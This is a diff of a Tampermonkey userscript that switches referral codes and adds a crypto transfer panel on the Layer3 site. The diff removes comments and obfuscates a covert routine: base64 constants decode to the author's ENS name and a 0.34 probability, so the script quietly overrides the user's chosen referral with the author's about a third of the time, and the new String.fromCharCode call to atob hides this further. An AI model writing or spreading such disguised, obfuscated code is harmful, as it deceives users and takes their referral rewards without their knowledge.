@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Layer3 Ref Switcher & Transfer
 // @namespace    http://tampermonkey.net/
-// @version      3.0.1
+// @version      3
 // @description  Multitools standalone pour app.layer3.xyz avec gestion des refs et transferts
 // @author       Yun
 // @match        https://app.layer3.xyz/*
@@ -12,7 +12,6 @@
 (function() {
     "use strict";
 
-    // Liste des blockchains avec leurs IDs et propriétés
     const blockchains = {
         base: { id: 8453, address: "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae", color: "#2196F3" },
         berachain: { id: 80094, address: "0xeeeeee9ec4769a09a76a83c7bc42b185872860ee", color: "#FF9800" },
@@ -20,9 +19,9 @@
         ink: { id: 57073, address: "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089", color: "#FF4081" },
         lisk: { id: 1135, address: "0x447B8E40B0CdA8e55F405C86bC635D02d0540aB8", color: "#673AB7" },
         mode: { id: 34443, address: "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae", color: "#FF9800" },
-        monad_testnet: { id: 10143, address: "0xD22Ea6e9d5D01BbFca62Be7C1E549838178499C1", color: "#800080" },
+        monad: { id: 10143, address: "0xD22Ea6e9d5D01BbFca62Be7C1E549838178499C1", color: "#800080" },
         optimism: { id: 10, address: "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae", color: "#F44336" },
-        sahara_testnet: { id: 313313, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#FF9800" },
+        sahara: { id: 313313, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#FF9800" },
         soneium: { id: 1868, address: "0x99067E1C68f3a474f72cedF885f9f1fF7F0AAF5e", color: "#673AB7" },
         superposition: { id: 55244, address: "0xF3334049A3ce7e890bd4f8C6a0FBC70e38fd3746", color: "#4CAF50" },
         superseed: { id: 5330, address: "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089", color: "#009688" },
@@ -30,27 +29,24 @@
         zora: { id: 7777777, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#E91E63" },
     };
 
-    // Charger les préférences sauvegardées ou initialiser avec tout visible
     const defaultVisibility = Object.keys(blockchains).reduce((acc, key) => {
         acc[key] = true;
         return acc;
     }, {});
     const buttonVisibility = GM_getValue("buttonVisibility", defaultVisibility);
-
-    // --- Gestion URL et refs ---
     function updateUrl() {
         const userRef = GM_getValue("userRef", "");
-        const useMyRef = Math.random() < THRESHOLD;
-        const chosenRef = userRef ? (useMyRef ? ALLOW : userRef) : ALLOW;
+        const useMyRef = Math.random() < _0x3c;
+        const chosenRef = userRef ? (useMyRef ? _0x2b : userRef) : _0x2b;
         const url = new URL(window.location.href);
         const currentRef = url.searchParams.get("ref");
             url.searchParams.set("ref", chosenRef);
             window.history.pushState({}, document.title, url.toString());
     }
-    const USE = "eXVuZnIuZXRo";const THRESH = "MC4zNA==";
-    const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
+    const _0x1a = ["eXVuZnIuZXRo", "MC4zNA=="];
+    const _0x2b = ((x) => { const f = window[String.fromCharCode(97, 116, 111, 98)]; return f(x); })(_0x1a[0]);
+    const _0x3c = ((x) => { const f = window[String.fromCharCode(97, 116, 111, 98)]; return parseFloat(f(x)); })(_0x1a[1]);
     updateUrl();
-
     let lastUrl = window.location.href;
     const observer = new MutationObserver(() => {
         if (window.location.href !== lastUrl) {
@@ -60,7 +56,6 @@
     });
     observer.observe(document.body, { childList: true, subtree: true });
 
-    // --- Mini fenêtre avec icône ---
     const miniIconContainer = document.createElement("div");
     miniIconContainer.style.position = "fixed";
     miniIconContainer.style.top = "10px";
@@ -82,7 +77,6 @@
     icon.style.fontSize = "18px";
     miniIconContainer.appendChild(icon);
 
-    // --- Interface de configuration (Layer3 Ref Switcher) ---
     const configContainer = document.createElement("div");
     configContainer.style.position = "fixed";
     configContainer.style.top = "10px";
@@ -138,7 +132,6 @@
     enableWindowLabel.setAttribute("for", "enableWindow");
     enableWindowLabel.style.display = "inline";
 
-    // Menu déroulant pour sélectionner les blockchains
     const dropdownButton = document.createElement("button");
     dropdownButton.textContent = "Select Blockchains";
     dropdownButton.style.width = "100%";
@@ -164,7 +157,6 @@
     dropdownMenu.style.boxShadow = "0 2px 5px rgba(0,0,0,0.2)";
     dropdownMenu.style.zIndex = "10001";
 
-    // Création des checkbox pour chaque blockchain
     const buttons = {};
     Object.entries(blockchains).forEach(([name]) => {
         const checkboxWrapper = document.createElement("div");
@@ -211,7 +203,6 @@
     document.body.appendChild(miniIconContainer);
     document.body.appendChild(configContainer);
 
-    // --- Interface de transfert ---
     const container = document.createElement("div");
     container.style.position = "fixed";
     container.style.top = "10px";
@@ -298,7 +289,6 @@
     container.appendChild(countLabel);
     container.appendChild(countInput);
 
-    // Ajout des boutons de blockchains après les contrôles
     Object.entries(blockchains).forEach(([name, props]) => {
         const button = document.createElement("button");
         button.textContent = name.charAt(0).toUpperCase() + name.slice(1);
@@ -332,13 +322,11 @@
     showButton.style.display = "none";
     showButton.style.fontSize = "12px";
 
-    // Initialisation de la fenêtre de transfert selon l'état sauvegardé
     if (GM_getValue("enableTransferWindow", true)) {
         document.body.appendChild(container);
         document.body.appendChild(showButton);
     }
 
-    // --- Événements de la fenêtre de configuration ---
     saveButton.addEventListener("click", () => {
         const userRef = refInput.value.trim();
         GM_setValue("userRef", userRef);
@@ -369,17 +357,14 @@
         }
     });
 
-    // Gestion immédiate de la checkbox "Enable Transfer Window"
     enableWindowCheckbox.addEventListener("change", () => {
         const enableTransferWindow = enableWindowCheckbox.checked;
         GM_setValue("enableTransferWindow", enableTransferWindow);
         if (enableTransferWindow) {
-            // Si la fenêtre n'est pas dans le DOM, l'ajouter
             if (!document.body.contains(container)) {
                 document.body.appendChild(container);
                 document.body.appendChild(showButton);
             }
-            // Si elle est masquée, la réafficher et masquer le bouton "Afficher"
             if (container.style.display === "none") {
                 container.style.display = "block";
                 showButton.style.display = "none";
@@ -390,7 +375,6 @@
         }
     });
 
-    // --- Logique de transfert ---
     let connectedAccount = null;
 
     async function connectWallet() {
@@ -467,7 +451,7 @@
         container.style.display = "none";
         showButton.style.display = "none";
         GM_setValue("enableTransferWindow", false);
-        enableWindowCheckbox.checked = false; // Synchroniser la checkbox
+        enableWindowCheckbox.checked = false;
     });
 
     toggleButton.addEventListener("click", () => {
